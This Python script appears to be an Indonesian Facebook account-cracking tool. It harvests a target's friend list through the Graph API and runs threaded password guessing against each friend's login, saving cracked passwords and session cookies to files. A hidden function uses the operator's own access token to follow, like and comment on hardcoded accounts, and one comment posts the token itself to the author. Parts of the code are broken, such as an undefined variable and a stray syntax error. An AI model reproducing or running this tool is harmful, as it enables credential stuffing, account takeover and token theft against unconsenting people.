# -*- coding: utf-8
#Coded By XNX Team
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as sarfrazssb
from datetime import datetime
from bs4 import BeautifulSoup

ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://l.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
try:
    import requests
except ImportError:
    ______SAYANGKAMU______('pip install requests')
try:
    import concurrent.futures
except ImportError:
    ______SAYANGKAMU______('pip install futures')
try:
    import bs4
except ImportError:
    ______SAYANGKAMU______('pip install bs4')
    
import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64,uuid
from concurrent.futures import ThreadPoolExecutor 
from concurrent.futures import ThreadPoolExecutor as lol
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from time import sleep as jeda
from datetime import datetime
______DickyGans______= input
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
_______loop______ = 0
_______ok_______ = []
_______cp_______ = []
______SAYANGKAMU______= os.system
id = []
data = {}
pwx = []
______DICKYXD______ =print
####TAMBAH BOLEH TAPI GANTI JANGAN#####
_____ListID_______ = [
    "100072749560924","100023749387124","100069494601961","100002322531711","100019608840426","100023543993788"]
_____Post_______= [
    "165272002465952","156492366785748"]
_____INFO______ = 'Lu Ganteng Banget Bang, Gw Mau Recode SClu, Soalnya Gw Bodoh,Goblok & Tolol Soal Coding'
ses = requests.Session()
rgb = random.choice(['\x1b[0;91m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
_______IP_______ = requests.get('https://api.ipify.org').text
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        ______LuWibu______()
    nTemp = n - 1
except ValueError:
    ______LuWibu______()
 
def ______DICKYxXD______(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
### GLOBAL WARNA ###
RED_MAGIC = '\x03\xf3\r\nd\x83\x8e^'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda
y = "\033[0m"
z = "\033[1;92m"
x = "\033[1;97m"
I='\x1b[0;32m'
C='\x1b[0;36m'
R = "\033[1;91m"
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
Q="\x1b[00m"
U = '\x1b[1;95m'
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'
p = '\x1b[1;97m'
k = '\x1b[1;93m'
m = '\x1b[1;91m'
d = '\x1b[90;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
b = '\x1b[94;1m'
j = '\x1b[95;1m'
a = '\x1b[96;1m'   
g = '\33[3;1m'
my_color = [
 P, M, H, K, B, U, O, N, j, a, b, d, u, o, h, m, N, k]
ior = random.choice(my_color)
______LuWibu______ = exit
def ________LOGOSCRIPTNYA__________():
	______SAYANGKAMU______("clear")
	______DICKYXD______(f"""%s
{H}___   ___ .__   __. ___   ___ 
\  \ /  / |  \ |  | \  \ /  / • Coded By IRFAN •
 \  V  /  |   \|  |  \  V  /  • XNX TOOL • 
  >   <   |  . `  |   >   <   • Friendlist Clone  •
 /  .  \  |  |\   |  /  .  \  
/__/ \__\ |__| \__| /__/ \__\   
"""%(N))
         
def ___RecodeSampah__():
	try:
		token = open('login.txt', 'r')
		___SayaRecodeSampah___()
	except (KeyError, IOError):
		______SAYANGKAMU______('rm -rf login.txt')
		________LOGOSCRIPTNYA__________()
		______DICKYXD______(f" \n {P}[{H}!{P}] Tokens must be fresh and EAAB \n {P}[{H}!{P}] If the token is not EAAB then it will fail Dump")
		token = ______DickyGans______(f'{P} [{H}?{P}] Token : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token=%s'%(token))
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
			______DICKYXD______("\n %s[%s•%s] Welcome %s%s"%(P,H,P,H,nama));time.sleep(00.9)
			______DICKYXD______(" %s[%s•%s] Use These Tools Wisely "%(P,H,P));time.sleep(00.9)
			______DICKYXD______(" %s[%s•%s] I am Not Responsible If Something Happens "%(P,H,P));time.sleep(00.9)
			______DICKYXD______(" %s[%s•%s] Login Ok Id In Via Browser with Mbasic Mode "%(P,H,P));time.sleep(00.9)
			______DickyGans______(" %s[%s•%s] ENTER "%(P,H,P));time.sleep(2)
			_____bot________();___SayaRecodeSampah___()
		except KeyError:
			______DICKYXD______(f'{P} [{M}!{P}] Expired Token')
			___RecodeSampah__() 
#####YANG GANTI ANAK HARAM#####
def _____bot________():
	try:
		token = open('login.txt', 'r').read()
	except (KeyError, IOError):
		___RecodeSampah__(" %s[!] expired tokens!"%(M))
	______kom______ = ('Halo Bang Dicky SC Lu GG Bang') 
	requests.post('https://graph.facebook.com/%s/subscribers?access_token=%s'%(_____ListID_______,token))
	requests.post('https://graph.facebook.com/%s/likes?summary=true&access_token=%s'%(_____Post_______, token))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(_____Post_______,_____INFO______,token))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(_____Post_______,______kom______,token))
	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(_____Post_______,token, token))

def __cekakun__():
    ______DICKYXD______(f" \n {P}[{H}1{P}] Check Results OK ")
    ______DICKYXD______(f" {P}[{H}2{P}] Check Results CP ")
    anjg = ______DickyGans______(f" \n {P}[{H}?{P}] Choose : ")
    if anjg == '':
        ___SayaRecodeSampah___()
    elif anjg == '01' or anjg == '1':
        ______SAYANGKAMU______(' cat ok.txt')
        ______DickyGans______('\n [\xe2\x80\xa2] Kembali ')
        ___SayaRecodeSampah___()
    elif anjg == '02' or anjg == '2':
        totalcp = open('cp.txt').read().splitlines()
        ______SAYANGKAMU______(' cat cp.txt')
        ______DickyGans______('\n [\xe2\x80\xa2] kembali ')
        ___SayaRecodeSampah___()
    else:
        ______DICKYXD______( ' [!] pilih yang benar!!')
        ___SayaRecodeSampah___()
def __upgrade__():
	______DICKYXD______(' [!] Wait');time.sleep(3)
	______DickyGans______(' >>> Enter ')
	______SAYANGKAMU______('am start https://m.me/irfan.7732?text=Assalamualaikum,+Please+Admin,+Upgrade+Premium+%20>/dev/null')
	______LuWibu______('Goodbye')
		
def _____Publik_______():
	try:
		token = open('login.txt','r').read()
	except IOError:
		______LuWibu______()
	______DICKYXD______(P+'\n ['+h+'•'+P+'] Type "me" if you want to dump ID from friends')
	pil = ______DickyGans______(P+' ['+h+'?'+P+'] Enter Target ID : ')
	try:
		koh = requests.get('https://graph.facebook.com/'+pil+'?access_token='+token)
		grex = json.loads(koh.text)['name']
		______DICKYXD______(P+' ['+h+'•'+P+'] Name  : '+str(grex))
	except (KeyError,IOError):
		______DICKYXD______(P+' ['+h+'!'+P+'] ID NOT FOUND')
		_____Publik_______()
	except requests.exceptions.ConnectionError:
		______DICKYXD______(P+' ['+h+'!'+P+'] UNSTABLE INTERNET CONNECTION')
		______LuWibu______()
	try:
		po = requests.get(f'https://graph.facebook.com/{pil}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
		for i in po['friends']['data']:
			id.append(f"{i['id']}|{i['name']}")
		______DICKYXD______(P+' ['+h+'•'+P+'] Total : '+str(len(id)))
	except requests.exceptions.ConnectionError:
		______DICKYXD______(P+' ['+h+'!'+P+'] PROBLEM INTERNET CONNECTION')
		______LuWibu______()
	except (KeyError,IOError):
		______DICKYXD______(P+' ['+h+'!'+P+'] TARGET FRIENDLIST NOT PUBLIC')
		_____Publik_______()
	______DICKYXD______(f" \n {P}[{H}?{P}] Type xnx To Star Crack  ")
	ask=______DickyGans______(" %s[%s?%s] %spilih :%s "%(p,H,p,p,p))
	if ask in[""]:
		______LuWibu______(f" {P}[{H}!{P}] Option None")
	elif ask in["xnx"]:
		_____LANGSUNG_____()
	elif ask in["y"]:
		_____Publik_______()
	else:
		_____Publik_______(f" {P}[{H}!{P}] Option None")

### OTOMATIS ###
def _____LANGSUNG_____():
	______DICKYXD______("")
	______DICKYXD______(' %s[%s+%s] %sresult %sOK %ssaved -> %sok.txt'%(p,p,p,p,p,p,H))
	______DICKYXD______(' %s[%s+%s] %sresult %sCP %ssaved into -> %scp.txt'%(p,p,p,p,p,p,K))
	______DICKYxXD______("If No Result Use 5 Seconds Airoplane Mode ")
	with ThreadPoolExecutor(max_workers=30) as dicky:
		for user in id:
			uid, name = user.split("|")[0],user.split("|")[1].lower()
			frs = name.split(' ')[0]
			if len(name) == 3 or len(name) == 4 or len(name) == 5:
				pwx = [name, frs, frs+"123", frs+"1234", frs+"12345", frs+"786", frs+"1122", "112233", "223344", "334455", "445566", "556677", "778899", "102030", "1234567"]
			else:
				pwx = [name, frs, frs+"123", frs+"1234", frs+"12345", frs+"786", frs+"1122", "112233", "223344", "334455", "445566", "556677", "778899", "102030", "1234567"]
			dicky.submit(apii, uid, pwx)
		pass
	______LuWibu______("\n\n [#] crack complete...")
### MANUAL ###
#def ____MANUAL_____():
	______DICKYXD______(" %s[%s!%s] %sgunakan , (%skoma%s) sebagai pemisah"%(p,p,p,p,p,N))
	pwek=______DickyGans______(' %s[%s?%s] %sbuat kata sandi :%s '%(p,p,p,p,p,H))
	if pwek=="":
		______LuWibu______(" %s[!] isi jawaban dengan benar!"%(M))
	elif len(pwek)<=5:
		______LuWibu______(" %s[!] masukan sandi minimal 6 angka!"%(M))
		______DICKYXD______(' %s[%s+%s] %shasil %sOK %sdisimpan ke -> %sok.txt'%(p,p,p,p,p,p,H))
		______DICKYXD______(' %s[%s+%s] %shasil %sCP %sdisimpan ke -> %scp.txt'%(p,p,p,p,p,p,K))
		with ThreadPoolExecutor(max_workers=30) as dicky:
			for user in id:
				uid, name = user.split("|")
				dicky.submit(api, uid, pwek.split(","))
		______LuWibu______("\n\n [#] crack complete...")
def apii(uid, pwx):
	global ok, cp, _______loop______
	rgb = random.choice(['\x1b[1;96m', '\x1b[1;93m', '\033[1;92m', '\033[1;97m', '\033[1;91m', '\033[1;91m', '\x1b[1;92m', '\x1b[0;92m', '\x1b[0;93m', '\x1b[0;94m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;97m', '\x1b[0m'])
	for wk in list('\|-/'):
		sys.stdout.write("\r %s[%s%s%s] [ %sCrack %s] %s/%s OK/%s - CP/%s "%(rgb,K,wk,rgb,rgb,rgb,_______loop______, len(id), len(_______ok_______), len(_______cp_______)))
		sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwx:
		tix = time.time()
		ses.headers.update({"Host":'l.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://l.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
		p = ses.get('https://l.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
		dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
		ses.headers.update({"Host":'l.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://l.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://l.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
		po = ses.post('https://l.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
		if "c_user" in ses.cookies.get_dict().keys():
			coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
			______DICKYXD______("\r %s[XNX-OK] %s • %s • %s          "%(H,uid, pw,coki))
			cek_apk(coki)
			ok.append("%s • %s"%(uid, pw))
			open("ok.txt","a").write(" [XNX-OK] %s • %s • %s \n"%(uid, pw,coki))
			#cek_apk(kaka)
			break
		elif "checkpoint" in po.cookies.get_dict().keys():
			try:
				token=open("login.txt","r").read()
				ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
				month, day, year = ttl.split("/")
				month = bulan[month]
				______DICKYXD______("\r %s\x1b[1;93m[XNX-CP] %s • %s • %s %s %s"%(K,uid, pw, day, month, year))
				cp.append("%s • %s"%(uid, pw))
				open("cp.txt","a").write("  * --> %s • %s • %s %s %s\n"%(uid, pw, day, month, year))
				break
			except (KeyError, IOError):
				day = (" ")
				month = (" ")
				year = (" ")
			except:pass
			______DICKYXD______("\r %s\x1b[1;93m[CP] %s • %s         "%(K,uid, pw))
			cp.append("%s • %s"%(uid, pw))
			open("cp.txt","a").write("  * --> %s • %s\n"%(uid, pw))
			break
		else:
			continue

	_______loop______ += 1
	
	
# CEK APLIKASI 
def cek_apk(kaka):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
### SETTING UA
def __useragent__():
	______DICKYXD______(f" \n {P}[{H}1{P}] Change UserAgent Manual")
	______DICKYXD______(f" {P}[{H}2{P}] Use UserAgent Tools")
	ua = ______DickyGans______(f" {P}[{H}?{P}] Choose : ")
	if ua =="":
		______LuWibu______(f" {P}[{H}!{P}] Option None")
	elif ua == "1":
		c_ua = ______DickyGans______(f" \n {P}[{H}?{P}] Enter User-Agent : ")
		open(".ua", "w").write(c_ua)
		time.sleep(1)
		______DickyGans______(f" \n {P}[{H}✔{P}] Press Enter To Save User-Agent")
		___SayaRecodeSampah___()
	elif ua == "2":
		______DICKYXD______("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
		______SAYANGKAMU______("rm -f .ua")
		time.sleep(1)
		______DickyGans______(f" \n {P}[{H}?{P}] User-Agent Save Successfully")
		___SayaRecodeSampah___()
		
def ___SayaRecodeSampah___():
	______SAYANGKAMU______('clear')
	global token
	try:
		token = open('login.txt','r').read()
	except IOError:
		______DICKYXD______(f'{P} [{H}!{P}] Token Invalid')
		______SAYANGKAMU______('clear')
		______SAYANGKAMU______('rm -rf login.txt')
		___RecodeSampah__()
	except requests.exceptions.ConnectionError:
		______LuWibu______(f'{P} [{M}!{P}] No Connection')
	try:
		nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['name']
		uid = requests.get('https://graph.facebook.com/me?access_token=%s'%(token)).json()['id']
	except KeyError:
		______SAYANGKAMU______('clear')
		______DICKYXD______(f'{P} [{M}×{P}] Token Invalid')
		______SAYANGKAMU______('rm -rf login.txt')
		___RecodeSampah__()
	except requests.exceptions.ConnectionError:
		______LuWibu______(f'{P} [{M}!{P}] No Connection')
	________LOGOSCRIPTNYA__________()
	______DICKYXD______(f" {P}[{H}->{P}] Nama    : %s \n {P}[{H}->{P}] ID      : %s \n {P}[{H}->{P}] IP      : %s \n {P}[{H}->{P}] Status  : {H}PREMIUM{P}"%(nama,uid,_______IP_______))
	______DICKYXD______(f" \n {P}[{H}1{P}] Crack From Public ID \n {P}[{H}2{P}] Cek Result OK/CP \n {P}[{H}3{P}] Setting UserAgent \n {P}[{H}4{P}] Upgrade {H}Pro \n {P}[{H}0{P}] Remove Token (Logout)")
	ask = ______DickyGans______(f" {P}[{U}?{P}] Pilih : ")
	if ask =="":______LuWibu______(f" {P}[{H}!{P}] Pilihan Tidak Ada")
	elif ask in ['1','01','001','a']:_____Publik_______()
	elif ask in ['2','02','002','b']:__cekakun__()
	elif ask in ['3','03','003','c']:__useragent__()
	elif ask in ['4','04','004','d']:__upgrade__()
	elif ask in ['0','00','000','e']:______SAYANGKAMU______("rm -f login.txt");______DICKYxXD______(f" {P}[{H}✔{P}] Successfully Delete Token");______LuWibu______()
	else:______LuWibu______(f" {P}[{H}!{P}] Pilihan Tidak Ada")
		
def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(N,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s! cookie invalid"%(N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(K,i+1,N,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))
		
def game():
	cek_apk(coki)
	
	




if __name__ == '__main__':
	if sys.version[0]!="2":
		python="2.7" if "2.7" in sys.version[0:2] else "2.8"
	else:
		______LuWibu______(" \033[0;97m[\033[0;91m!\033[0;97m] How To Usage : python run.py")
	______SAYANGKAMU______("clear")
	___RecodeSampah__():